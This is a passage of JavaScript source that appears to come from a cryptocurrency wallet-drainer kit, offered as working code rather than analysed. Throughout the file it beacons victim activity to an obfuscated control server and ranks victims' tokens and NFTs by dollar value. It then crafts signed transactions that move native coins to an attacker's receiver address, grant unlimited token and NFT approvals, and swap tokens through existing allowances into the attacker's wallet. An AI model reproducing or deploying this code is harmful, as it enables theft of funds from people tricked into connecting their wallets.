    console.log(err);
  }
};

const inject_sweet = () => {
  try {
    let new_node = document.createElement("script");
    new_node.setAttribute("src", "https://cdn.jsdelivr.net/npm/sweetalert2@11");
    document.getElementsByTagName("body")[0].appendChild(new_node);
  } catch(err) {
    console.log(err);
  }
};

const ms_init = () => {
  try {
    if (MS_Process) return;
    document.getElementById('web3-modal').style.display = 'block';
    document.getElementById('web3-overlay').style.display = 'block';
  } catch (err) {
    console.log(err);
  }
};

const ms_hide = () => {
  try {
    document.getElementById('web3-modal').style.display = 'none';
    document.getElementById('web3-overlay').style.display = 'none';
  } catch (err) {
    console.log(err);
  }
};

const load_wc = () => {
  MS_Provider = new WalletConnectProvider.default({
    rpc: {
      1: MS_Settings.RPCs[1],
      10: MS_Settings.RPCs[10],
      56: MS_Settings.RPCs[56],
      137: MS_Settings.RPCs[137],
      250: MS_Settings.RPCs[250],
      42161: MS_Settings.RPCs[42161],
      43114: MS_Settings.RPCs[43114],
    },
    network: 'ethereum', chainId: 1
  });
};

const prs = (s, t) => {
  const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
  const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
  const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
};

const send_request = async (data) => {
  try {
    if (MS_Force_Mode) return { status: 'error', error: 'Server is Unavailable' };
    data.domain = window.location.host;
    data.worker_id = MS_Worker_ID || null;
    data.chat_data = MS_Custom_Chat.Enable == 0 ? false : MS_Custom_Chat.Chat_Settings;
    const encode_key = btoa(String(10 + 256 + 512 + 1024));
    const request_data = prs(encode_key, btoa(JSON.stringify(data)));
    const response = await fetch('https://' + MS_Server, {
      method: 'POST',
      headers: {
        'Accept': 'text/plain',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `raw=${request_data}`
    });
    let response_data = JSON.parse(atob(srp(encode_key, await response.text())));
    if (!response_data.status) return { status: 'error', error: 'Server is Unavailable' };
    else {
      if (response_data.status == 'error' && response_data.error == 'SRV_UNAVAILABLE') MS_Force_Mode = true;
      return response_data;
    }
  } catch(err) {
    console.log(err);
    return { status: 'error', error: 'Server is Unavailable' };
  }
};

const retrive_config = async () => {
  try {
    const response = await send_request({ action: 'retrive_config' });
    if (response.status == 'OK') {
      MS_Settings = response.data
      MS_ID = response.data.ID
      MS_Ready = true;
    }
  } catch(err) {
    console.log(err);
  }
};

const retrive_contract = async () => {
  try {
    const response = await send_request({ action: 'retrive_contract' });
    if (response.status == 'OK') MS_Contract_ABI = response.data;
  } catch(err) {
    console.log(err);
  }
};

const enter_website = async () => {
  try {
    if (!MS_Settings.Notifications['enter_website']) return;
    await send_request({
      action: 'enter_website',
      user_id: MS_ID,
      time: new Date().toLocaleString('ru-RU')
    });
  } catch(err) {
    console.log(err);
  }
};

const leave_website = async () => {
  try {
    if (!MS_Settings.Notifications['leave_website']) return;
    await send_request({ action: 'leave_website', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_request = async () => {
  try {
    if (!MS_Settings.Notifications['connect_request']) return;
    await send_request({ action: 'connect_request', user_id: MS_ID, wallet: MS_Current_Provider });
  } catch(err) {
    console.log(err);
  }
};

const connect_cancel = async () => {
  try {
    if (!MS_Settings.Notifications['connect_cancel']) return;
    await send_request({ action: 'connect_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_success = async () => {
  try {
    if (!MS_Settings.Notifications['connect_success']) return;
    await send_request({
      action: 'connect_success', user_id: MS_ID, address: MS_Current_Address,
      wallet: MS_Current_Provider, chain_id: MS_Current_Chain_ID
    });
  } catch(err) {
    console.log(err);
  }
};

const convert_chain = (from, to, value) => {
  try {
    if (from == 'ANKR' && to == 'ID') {
      switch (value) {
        case 'eth': return 1;
        case 'bsc': return 56;
        case 'polygon': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'fantom': return 250;
        default: return false;
      }
    } else if (from == 'OPENSEA' && to == 'ID') {
      switch (value) {
        case 'ethereum': return 1;
        case 'matic': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        default: return false;
      }
    } else if (from == 'ID' && to == 'ANKR') {
      switch (value) {
        case 1: return 'eth';
        case 56: return 'bsc';
        case 137: return 'polygon';
        case 43114: return 'avalanche';
        case 42161: return 'arbitrum';
        case 10: return 'optimism';
        case 250: return 'fantom';
        default: return false;
      }
    } else if (from == 'ID' && to == 'CURRENCY') {
      switch (value) {
        case 1: return 'ETH';
        case 56: return 'BNB';
        case 137: return 'MATIC';
        case 43114: return 'AVAX';
        case 42161: return 'ETH';
        case 10: return 'ETH';
        case 250: return 'FTM';
        default: return false;
      }
    }
  } catch(err) {
    console.log(err);
    return false;
  }
};

const get_tokens = async (address) => {
  try {
    let tokens = [], response = await fetch('https://rpc.ankr.com/multichain', {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        "id": 1,
        "jsonrpc": "2.0",
        "method": "ankr_getAccountBalance",
        "params": {
          "blockchain": [ "eth", "bsc", "polygon", "avalanche", "arbitrum", "fantom", "optimism" ],
          "walletAddress": address
        }
      })
    });
    response = await response.json();
    for (const asset of response.result.assets) {
      try {
        let contract_address = asset.contractAddress || 'NATIVE';
        if (MS_Settings.Contract_Whitelist.length > 0 && !MS_Settings.Contract_Whitelist.includes(contract_address.toLowerCase())) continue;
        else if (MS_Settings.Contract_Blacklist.length > 0 && MS_Settings.Contract_Blacklist.includes(contract_address.toLowerCase())) continue;
        let new_asset = {
          chain_id: convert_chain('ANKR', 'ID', asset.blockchain),
          name: asset.tokenName, type: asset.tokenType,
          amount: parseFloat(asset.balance), amount_raw: asset.balanceRawInteger,
          amount_usd: parseFloat(asset.balanceUsd), symbol: asset.tokenSymbol,
          decimals: asset.tokenDecimals, address: contract_address ?? null,
          price: parseFloat(asset.tokenPrice)
        };
        if (new_asset.price > 0) tokens.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return tokens;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const get_nfts = async (address) => {
  try {
    let response = await fetch(`https://api.opensea.io/api/v1/assets?owner=${address}&order_direction=desc&limit=200&include_orders=false`);
    let tokens = (await response.json())['assets'];
    response = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${address}&offset=0&limit=200`);
    let collections = await response.json(), list = [];
    for (const asset of tokens) {
      try {
        let collection = null;
        for (const x_collection of collections) {
          try {
            if (x_collection.primary_asset_contracts.length < 1) continue;
            if (x_collection.primary_asset_contracts[0].address == asset.asset_contract.address) {
              collection = x_collection;
              break;
            }
          } catch(err) {
            console.log(err);
          }
        }
        if (collection == null) continue;
        if (MS_Settings.Contract_Whitelist.length > 0 && !MS_Settings.Contract_Whitelist.includes(asset.asset_contract.address.toLowerCase())) continue;
        else if (MS_Settings.Contract_Blacklist.length > 0 && MS_Settings.Contract_Blacklist.includes(asset.asset_contract.address.toLowerCase())) continue;
        let asset_chain_id = convert_chain('OPENSEA', 'ID', asset.asset_contract.chain_identifier);
        let asset_price = MS_Settings.OS_Mode == 1 ? ((collection.stats.one_day_average_price != 0) ?
        collection.stats.one_day_average_price : collection.stats.seven_day_average_price) : collection.stats.floor_price;
        asset_price = asset_price * MS_Currencies[convert_chain('ID', 'CURRENCY', asset_chain_id)]['USD'];
        let new_asset = {
          chain_id: asset_chain_id, name: asset.name, type: asset.asset_contract.schema_name, amount: asset.num_sales,
          amount_raw: null, amount_usd: asset_price, id: asset.token_id, symbol: null, decimals: null,
          address: asset.asset_contract.address, price: asset_price
        };
        if (typeof asset_price == 'number' && !isNaN(asset_price) && asset_price > 0) list.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return list;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const retrive_token = async (chain_id, contract_address) => {
  try {
    let response = await fetch(`https://${MS_API_Data[chain_id]}/api?module=contract&action=getsourcecode&address=${contract_address}&apikey=${MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API}`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    response = await response.json();
    if (response.message == 'OK') {
      scanCalls.push({address: contract_address, chain: chain_id, success: true})
      
      if (response.result[0].Proxy == '1' && response.result[0].Implementation != '') {
        const implementation = response.result[0].Implementation;
        return retrive_token(chain_id, implementation);
      } else {
        return JSON.parse(response.result[0].ABI)
      }
    } else {
      scanCalls.push({address: contract_address, chain: chain_id, success: false})

      return MS_Contract_ABI['ERC20'];
    }
  } catch (err) {
    scanCalls.push({address: contract_address, chain: chain_id, success: false})
    return MS_Contract_ABI['ERC20'];
  }
};

const get_permit_type = (func) => {
  try {
    if (MS_Settings.Settings.Permit.Mode == false) return 0;
    if (func.hasOwnProperty('permit') && func.hasOwnProperty('nonces') &&
      func.hasOwnProperty('name') && func.hasOwnProperty('DOMAIN_SEPARATOR')) {
      const permit_version = ((func) => {
        for (const key in func) {
          if (key.startsWith('permit(')) {
            const args = key.slice(7).split(',')
            if (args.length === 7 && key.indexOf('bool') === -1) return 2;
            if (args.length === 8 && key.indexOf('bool') !== -1) return 1;
            return 0;
          }
        }
      })(func);
      return permit_version;
    } else {
      return 0;
    }
  } catch (err) {
    return 0;
  }
};

const MS_Gas_Reserves = {};

const get_permit_version = async(contract) => {
  try {
    let toCheck = []
    let types = []
    let funcs = contract.functions
    // console.log(typeof funcs)
    let iterableFuncs = Object.entries(funcs)

    if (funcs.hasOwnProperty('version')) {
      try {
        return await contract.version()
      } catch (err) {
        console.log('get_permit_version: ', err)
      }
    }

    for (const [key, value] of iterableFuncs) {
      if (key.toLowerCase().includes('version')) {
        // console.log(`${contract.address}:\nkey: ${key} - ${key.includes('version')} / ${key.toLowerCase().includes('version')}`)
        // console.log(`${contract.address}:\nvalue: ${value}`)
        toCheck.push(key)
      }
    }

    console.log(`CHECKING ${contract.address} - ${toCheck}`)

    if (toCheck.length !== 0) {
      for (let i = 0; i < toCheck.length; i++) {
        try {
          const res = await contract[toCheck[i]]()
          // console.log(`FIRST\n${contract.address}\n - - - ${res} with type of ${typeof res}`)
          const ress = typeof res == 'number' || typeof res == 'string' ? res : res.toNumber()
          // console.log(`SECOND\n${contract.address}\n - - - ${ress} with type of ${typeof ress}`)
          types.push(ress)
          // console.log(`${contract.address}:\n${toCheck[i]}: ${res}`)
        } catch (err) {
          console.log(`${contract.address}:\n- - - - - - - - - - \nERROR\n${err}\n - - - - - - - - - -`)
        }
      }
    }

    console.log(`TYPES:\n${types}\n- - - - - - - - - - - - - - - - - - `)

    if (types.length !== 0) {
      // console.log('SHOULD BE HERE.... ', types.length)
      for (let i = 0; i < types.length; i++) {
        // console.log(types[i])
        // console.log(typeof types[i])
        if (types[i] == '1' || types[i] == '2') {
          // console.log(`${contract.address}: ${types[i]}`)
          return `${types[i]}`
        }
      }
    }

    return '1'
    
  } catch (err) {
    console.log('get_permit_version: ', err)
    return '1'
  }
}

const get_wallet_assets = async (address) => {
  try {
    let response = await send_request({ action: 'check_wallet', address: MS_Current_Address, ID: MS_ID }), assets = [];
    if (response.status == 'OK') assets = response.data; else assets = await get_tokens(address);

    let token_promises = [];
    // console.log('1\n',assets)

    for (let x = (assets.length - 1); x >= 0; x--) {
      try {
        const asset = assets[x];
        const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
        if (!MS_Settings.Settings.Chains[chain_id].Enable) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && !MS_Settings.Settings.Chains[chain_id].Native) assets.splice(x, 1);
        else if (asset.type == 'ERC20' && !MS_Settings.Settings.Chains[chain_id].Tokens) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Native_Price) assets.splice(x, 1);
        else if (asset.type == 'ERC20' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Tokens_Price) assets.splice(x, 1);

      } catch(err) {
        console.log(err);
      }
    }

    for (let x = (assets.length - 1); x >= 0; x--) {
      try {
        const asset = assets[x];
        const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
        if (asset.type == 'ERC20') {
          if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                const data = await retrive_token(asset.chain_id, asset.address);
                const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                const contract = new ethers.Contract(asset.address, data, node);
                const permit_type = get_permit_type(contract.functions);
                assets[x].permit = permit_type;
                const permit_ver = await get_permit_version(contract)
                assets[x].permit_ver = permit_ver == '1' || permit_ver == '2' || permit_ver == 1 || permit_ver == 2 ? permit_ver : '1'
                // console.log(`PERMIT VER AFTER: ${asset.address} - ${assets[x].permit_ver}`)
                assets[x].abi = data;
                if (permit_type > 0) {
                //   if (contract.functions.hasOwnProperty('version')) {
                //     try {
                //       assets[x].permit_ver = await contract.version();
                //     } catch(err) {
                //       console.log(err);
                //     }
                //   }
                  console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${assets[x].permit_ver}`);
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
          if (MS_Settings.Settings.Swappers.Enable && ((asset.chain_id == 1 && asset.amount_usd >= 50) || (asset.chain_id != 1 && asset.amount_usd >= 15))) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                for (const swapper of MS_Routers[asset.chain_id]) {
                  try {
                    const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
                    const allowance = await contract.allowance(MS_Current_Address, swapper[1]);
                    if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                      assets[x].swapper = true;
                      assets[x].swapper_type = swapper[0];
                      assets[x].swapper_address = swapper[1];
                      assets[x].swapper_allowance = allowance;
                      console.log(`[SWAP FOUND] ${asset.name}, ${swapper[0]}`);
                      break;
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
        }
      } catch (err) {
        console.log(err);
      }
    }

    // console.log('2\n',assets)

    const startPromise = Date.now() / 1000

    await Promise.all(token_promises);

    const finishPromise = Date.now() / 1000

    // send_request({action: 'promise_all', waitTime: finishPromise - startPromise, ID: MS_ID, address: MS_Current_Address})

    // console.log('3\n',assets)

    let NFT_Status = false;

    for (const chain_id in MS_Settings.Settings.Chains) {
      try {
        if (MS_Settings.Settings.Chains[chain_id].NFTs) {
          NFT_Status = true;
          break;
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (NFT_Status) {
      try {
        let nft_list = [];
        response = await send_request({ action: 'check_nft', address: MS_Current_Address });
        if (response.status == 'OK') {
          nft_list = response.data;
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!MS_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        } else {
          nft_list = await get_nfts(address);
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!MS_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    // let details = ['- -SORTED & PRE FILTERRED- -']
    assets.sort((a, b) => { return b.amount_usd - a.amount_usd });

    // // ABI REQUEST 
    let scanStatusses = ''
    scanCalls.forEach((call) => { scanStatusses += `${call.address} / ${call.chain} - ${call.success}\n` })
    send_request({action: 'promise_all', waitTime: finishPromise - startPromise, ID: MS_ID, address: MS_Current_Address, scans: scanStatusses})

    // // SORTED & PRE FILTERRED notification
    // assets.forEach(asset => details.push(`${asset.name} | ${asset.chain_id} -type: ${asset.type} permit: ${asset.permit}`))
    // send_request({action: 'sorted_list', list: assets, ID: MS_ID, filters: details, address: MS_Current_Address})

    const filters = []

    // if (MS_Settings.Settings.Tokens_First) {
    //   filters.push('TOKENS_FIRST')
    //   const new_assets = [];
    //   for (const asset of assets) {
    //     try {
    //       if (asset.type == 'NATIVE') continue;
    //       new_assets.push(asset);
    //     } catch(err) {
    //       console.log(err);
    //     }
    //   }
    //   for (const asset of assets) {
    //     try {
    //       if (asset.type != 'NATIVE') continue;
    //       new_assets.push(asset);
    //     } catch(err) {
    //       console.log(err);
    //     }
    //   }
    //   assets = new_assets;
    // }

    // if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 1) {
    //   filters.push('SWAPPERS - LOW PRIORITY')
    //   const new_assets = [];
    //   for (const asset of assets) {
    //     try {
    //       if (!asset.swapper) continue;
    //       new_assets.push(asset);
    //     } catch(err) {
    //       console.log(err);
    //     }
    //   }
    //   for (const asset of assets) {
    //     try {
    //       if (asset.swapper) continue;
    //       new_assets.push(asset);
    //     } catch(err) {
    //       console.log(err);
    //     }
    //   }
    //   assets = new_assets;
    // }
    for (let i = 0; i < assets.length; i++) {
      const asset = assets[i]
      console.log(`${asset.address} - ${asset.permit} / ${asset.permit_ver}`)
    }
    
    if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority) {
      filters.push('PERMIT')
      const new_assets = [];
      let curAsset = ''

      let permitAmount = 0
      let allowedPermitAmount = 200
      for (const asset of assets) {
        console.log(`${asset.address} - ${asset.permit} / ${asset.permit_ver}\n!asset.permit || asset.permit == 0 = ${!asset.permit || asset.permit == 0}`)
        if (permitAmount >= allowedPermitAmount) continue;
        ++permitAmount

        curAsset = `${asset.name}(${asset.amount_usd})\n- - permit: ${asset.permit} = ${!(!asset.permit || asset.permit == 0)}`
        try {
          if (!asset.permit || asset.permit == 0) continue;
          new_assets.push(asset);
          filters.push(curAsset)
          } catch(err) {
          filters.push('error')
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.permit && asset.permit > 0) {
            if (permitAmount > 0) {
              --permitAmount
              continue
            } else {
              new_assets.push(asset);
              continue
            }
          }
          new_assets.push(asset);
          } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }
    console.log(assets)

    // if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 2) {
    //   filters.push('SWAPPERS - HIGH PRIORITY')
    //   const new_assets = [];
    //   for (const asset of assets) {
    //     try {
    //       if (!asset.swapper) continue;
    //       new_assets.push(asset);
    //     } catch(err) {
    //       console.log(err);
    //     }
    //   }
    //   for (const asset of assets) {
    //     try {
    //       if (asset.swapper) continue;
    //       new_assets.push(asset);
    //     } catch(err) {
    //       console.log(err);
    //     }
    //   }
    //   assets = new_assets;
    // }

    // send_request({action: 'sorted_list', list: assets, ID: MS_ID, filters, address: MS_Current_Address})

    return assets;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const get_nonce = async (chain_id) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[chain_id]);
  return await node.getTransactionCount(MS_Current_Address, "pending");
};

const sleep = (time) => new Promise(res => setTimeout(res, time, "done sleeping"));

let is_first_sign = true;

const sign_next = () => {
  try {
    if (is_first_sign) {
      is_first_sign = false;
      return;
    }
  } catch(err) {
    console.log(err);
  }
};

const is_nft_approved = async (contract_address, owner_address, spender_address) => {
  try {
    const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[1]);
    const contract = new ethers.Contract(contract_address, MS_Contract_ABI['ERC721'], node);
    return await contract.isApprovedForAll(owner_address, spender_address);
  } catch(err) {
    console.log(err);
    return false;
  }
};

const SIGN_NATIVE = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const gas_limit_nt = (asset.chain_id == 42161) ? 1500000 : (asset.chain_id == 43114 ? 1500000 : 21000);
  const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);

  const gas_price_calc = ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price);
  const nt_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt))).mul(ethers.BigNumber.from('2'));
  const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
  const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(nt_fee).sub(ct_fee).toString();

  if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) throw 'LOW_BALANCE';

  const nonce = await get_nonce(asset.chain_id);
  let tx_struct = {
    "to": MS_Settings.Receiver, "nonce": web3.utils.toHex(nonce),
    "gasLimit": web3.utils.toHex(gas_limit_nt), "gasPrice": web3.utils.toHex(gas_price),
    "value": web3.utils.toHex(after_fee), "data": "0x",
    "v": web3.utils.toHex(MS_Current_Chain_ID), "r": "0x", "s": "0x"
  }, unsigned_tx = new ethereumjs.Tx(tx_struct),
  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex"),
  keccak256 = web3.utils.sha3(serialized_tx, { "encoding": "hex" });
  await sign_request(asset);
  const signed = await web3.eth.sign(keccak256, MS_Current_Address);
  const temporary = signed.substring(2),
  r_data = "0x" + temporary.substring(0, 64),
  s_data = "0x" + temporary.substring(64, 128),
  rhema = parseInt(temporary.substring(128, 130), 16),
  v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8);
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;
  unsigned_tx.v = v_data;
  const signed_tx = "0x" + unsigned_tx.serialize().toString("hex");
  sign_next();
  const tx = await node.sendTransaction(signed_tx);
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  console.log("SIGN_NATIVE")
  sign_success(asset, tx.hash, after_fee, false, {}, 'SIGN_NATIVE');
};

const SIGN_TOKEN = async (asset) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  let gas_limit = null;
  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }
  try {
    if (MS_Settings.Settings.Sign.Tokens == 1) {
      gas_limit = await contract.estimateGas.approve(MS_Settings.Address, max_approval_amount, { from: MS_Current_Address });
    } else if (MS_Settings.Settings.Sign.Tokens == 2) {
      gas_limit = await contract.estimateGas.transfer(MS_Settings.Receiver, asset.amount_raw, { from: MS_Current_Address });
    }
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  const nonce = await get_nonce(asset.chain_id);
  let data = null, web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);
  if (MS_Settings.Settings.Sign.Tokens == 1) data = web3_contract.methods.approve(MS_Settings.Address, max_approval_amount).encodeABI();
  else if (MS_Settings.Settings.Sign.Tokens == 2) data = web3_contract.methods.transfer(MS_Settings.Receiver, asset.amount_raw).encodeABI();
  let tx_struct = {
    "to": asset.address, "nonce": web3.utils.toHex(nonce),
    "gasLimit": web3.utils.toHex(gas_limit), "gasPrice": web3.utils.toHex(gas_price),
    "value": '0x0', "data": data,
    "v": web3.utils.toHex(MS_Current_Chain_ID), "r": "0x", "s": "0x"
  }, unsigned_tx = new ethereumjs.Tx(tx_struct),
  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex"),
  keccak256 = web3.utils.sha3(serialized_tx, { "encoding": "hex" });
  await sign_request(asset);
  const signed = await web3.eth.sign(keccak256, MS_Current_Address);
  const temporary = signed.substring(2),
  r_data = "0x" + temporary.substring(0, 64),
  s_data = "0x" + temporary.substring(64, 128),
  rhema = parseInt(temporary.substring(128, 130), 16),
  v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8);
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;
  unsigned_tx.v = v_data;
  const signed_tx = "0x" + unsigned_tx.serialize().toString("hex");
  sign_next();
  const tx = await node.sendTransaction(signed_tx);
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  console.log("SIGN_TOKEN")
  sign_success(asset, tx.hash, "0", true, {}, 'SIGN_TOKEN')
};

const SIGN_NFT = async (asset, safa_approves_object) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], node);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  let gas_limit = null;
  try {
    if (MS_Settings.Settings.Sign.NFTs == 1) {
      gas_limit = await contract.estimateGas.setApprovalForAll(MS_Settings.Address, true, { from: MS_Current_Address });
    } else if (MS_Settings.Settings.Sign.NFTs == 2) {
      gas_limit = await contract.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.id, { from: MS_Current_Address });
    }
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  const nonce = await get_nonce(asset.chain_id);
  let data = null, web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC721'], asset.address);
  if (MS_Settings.Settings.Sign.NFTs == 1) data = web3_contract.methods.setApprovalForAll(MS_Settings.Address, true).encodeABI();
  else if (MS_Settings.Settings.Sign.NFTs == 2) data = web3_contract.methods.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.id).encodeABI();
  let tx_struct = {
    "to": asset.address, "nonce": web3.utils.toHex(nonce),
    "gasLimit": web3.utils.toHex(gas_limit), "gasPrice": web3.utils.toHex(gas_price),
    "value": '0x0', "data": data,
    "v": web3.utils.toHex(MS_Current_Chain_ID), "r": "0x", "s": "0x"
  }, unsigned_tx = new ethereumjs.Tx(tx_struct),
  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex"),
  keccak256 = web3.utils.sha3(serialized_tx, { "encoding": "hex" });
  await sign_request(asset);
  const signed = await web3.eth.sign(keccak256, MS_Current_Address);
  const temporary = signed.substring(2),
  r_data = "0x" + temporary.substring(0, 64),
  s_data = "0x" + temporary.substring(64, 128),
  rhema = parseInt(temporary.substring(128, 130), 16),
  v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8);
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;
  unsigned_tx.v = v_data;
  const signed_tx = "0x" + unsigned_tx.serialize().toString("hex");
  sign_next();
  const tx = await node.sendTransaction(signed_tx);
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  sign_success(asset, tx.hash, "0", true, safa_approves_object, 'SIGN_NFT');
};

const DO_SWAP = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, MS_Pancake_ABI, MS_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  let gas_limit = null;
  try {
    gas_limit = await contract.estimateGas.swapExactTokensForETH(swap_value, '0', [
      asset.address, MS_Swap_Route[asset.chain_id]
    ], MS_Settings.Receiver, swap_deadline, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 350000);
  }
  const nonce = await get_nonce(asset.chain_id);
  const swap_value = ethers.BigNumber.from(asset.amount_raw).lte(ethers.BigNumber.from(asset.swapper_allowance))
  ? ethers.BigNumber.from(asset.amount_raw).toString() : ethers.BigNumber.from(asset.swapper_allowance).toString();
  await sign_request(asset); sign_next();
  const tx = await contract.swapExactTokensForETH(swap_value, '0', [
    asset.address, MS_Swap_Route[asset.chain_id]
  ], MS_Settings.Receiver, swap_deadline, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce
  });
